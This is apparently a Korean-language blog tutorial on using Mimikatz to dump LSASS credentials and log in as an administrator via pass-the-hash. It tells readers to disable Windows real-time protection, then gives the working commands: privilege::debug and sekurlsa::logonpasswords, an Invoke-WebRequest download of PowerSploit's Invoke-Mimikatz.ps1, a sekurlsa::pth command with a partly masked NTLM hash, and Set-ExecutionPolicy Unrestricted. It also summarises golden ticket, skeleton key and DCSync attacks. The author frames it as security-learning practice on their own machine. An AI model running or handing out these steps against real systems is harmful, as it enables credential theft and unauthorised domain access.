### mimikatz 사용 (lsass 메모리 덤프 및 관리자 계정 로그인)


#### 1. 설치

https://github.com/ParrotSec/mimikatz

위 사이트에서 다운로드 가능하며, Windows 보안 실시간 보호 등을 꺼주어야 다운로드 가능합니다.



- 개요

Mimikatz는 사용자가 메모리 또는 Windows 운영 체제에서 암호, 해시 및 Kerberos 티켓과 같은 인증 자격 증명을 추출할 수 있는 악용 후 도구입니다. 원래 Windows 운영 체제의 보안 취약점을 입증하기 위한 개념 증명 도구로 개발되었지만 현재는 공격자와 보안 전문가 모두가 보안 평가 및 침투 테스트를 수행하는 데 일반적으로 사용됩니다. Mimikatz를 사용하면 공격자는 인증 메커니즘을 우회하고 대상 시스템의 중요한 리소스에 액세스할 수 있는 pass-the-hash, pass-the-ticket 및 골든 티켓 공격과 같은 다양한 공격을 수행할 수 있습니다.


- 기능

Mimikatz는 Windows 시스템에서 다양한 악용 후 작업을 수행하기 위한 다목적 도구입니다. Mimikatz로 할 수 있는 다른 작업은 다음과 같습니다.

* LSASS 메모리 덤프: 이 명령은 LSASS(Local Security Authority Subsystem Service) 프로세스의 메모리에서 암호, 해시 및 Kerberos 티켓과 같은 자격 증명을 추출합니다.
* Pass-the-Hash: 이 기술을 사용하면 공격자가 실제 암호를 모르더라도 사용자 암호의 해시를 사용하여 원격 시스템에 인증할 수 있습니다.
* Pass-the-Ticket: 이 기술을 사용하면 공격자가 실제 사용자의 암호를 모르더라도 Kerberos 티켓을 사용하여 원격 시스템에 인증할 수 있습니다.
* 골든 티켓: 이 기술을 사용하면 공격자가 도메인의 모든 리소스에 액세스하는 데 사용할 수 있는 위조된 Kerberos TGT(Ticket Granting Ticket)를 만들 수 있습니다.
* 실버 티켓: 이 기술을 사용하면 공격자가 도메인의 특정 리소스에 대한 액세스 권한을 얻는 데 사용할 수 있는 위조된 Kerberos 서비스 티켓을 만들 수 있습니다.
* 스켈레톤 키: 이 기술을 사용하면 공격자가 가짜 암호를 도메인 컨트롤러의 메모리에 주입하여 도메인의 모든 사용자에 대한 암호 인증을 효과적으로 우회할 수 있습니다.
* DCSync: 이 기술을 사용하면 관리 권한이 있는 공격자가 도메인 컨트롤러에서 암호 데이터를 복제하여 도메인의 자격 증명 데이터베이스에 효과적으로 액세스할 수 있습니다.
 

#### Pass-The-Hash

Pass-The-Hash는 패스워드값을 사용하는 것이 아닌 패스워드의 해시값을 사용해서 자격증명을 하는 방식입니다. 로그인할 때 우리는 비밀번호를 치지만, Pass-The-Hash 기능을 이용하면 아이디와 해시값을 사용해서 로그인할 수 있습니다. 
Mimikatz를 통해서 lsass 메모리덤프 및 User ID와 NTLM Hash 값을 알아내 일반적인 비밀번호가 아닌 Hash 값으로 로그인할 예정입니다.


#### lsass 메모리 덤프 및 Pass-The-Hash를 이용하여 관리자 계정 시도

* 주의사항
  mimikatz 파일을 다운로드 받은 후 관리자권한으로 실행하여야 에러가 나지 않고 아래와 같이 실행됩니다.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

```

사진
사진

관리자계정이 아닌 다른 계정으로 mimikatz를 실행해주시고 위와 같이 명령어를 입력해주시면 위와 같이 정보를 얻을 수 있습니다.

윈도우10 OS에서도 실행되는 것을 확인했습니다.

위에서 얻은 정보 중 Username, Domain, NTLM 정보를 적어놓습니다. 이후 파워쉘을 실행하고 Mimikatz 파워쉘 스크립트를 아래 명령어로 다운로드 받습니다.

```

Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1

```

위에서 다운로드 받게되면 아래 파일이 생깁니다.

<img width="615" height="44" alt="image" src="https://github.com/user-attachments/assets/1981f31d-f797-413d-90c2-891f11bbc197" />


이후 Pass-The-Hash 기능으로 NTLM hash 값을 이용하여 관리자 계정으로 접근하는 명령어를 실행합니다.

```

invoke-mimikatz -command '"sekurlsa::pth /user:user/domain:DESKTOP-B6EDDU2 /ntlm:c5928614e7dcd1e3ec18503cb1***** /run:powershell.exe"'

```
* 주의사항
기본적으로 위 명령어는 바로 실행되지 않더라구요.

<img width="841" height="105" alt="image" src="https://github.com/user-attachments/assets/7790099f-4fe8-4dda-9140-45f74f68f317" />

위 명령어를 바로 실행할 경우 위 사진과 같은 오류메시지가 발생하고 이를 해결하는 방법으로는 

모든 제약을 푸는 아래 명령어를 입력한 후 시도해주시면 됩니다.

```

Set-ExecutionPolicy Unrestricted

```

관리자 계정 접근이 정상적으로 되었는지 whoami , ipconfig 등 다양한 명령어를 시도해봅니다

<img width="852" height="232" alt="image" src="https://github.com/user-attachments/assets/143ebbad-2d6a-4eb2-9d8e-7b707c94204e" />

위 사진을 보니 정상적으로 제 관리자계정인 user 계정으로 정상 접근됨이 확인되었습니다.


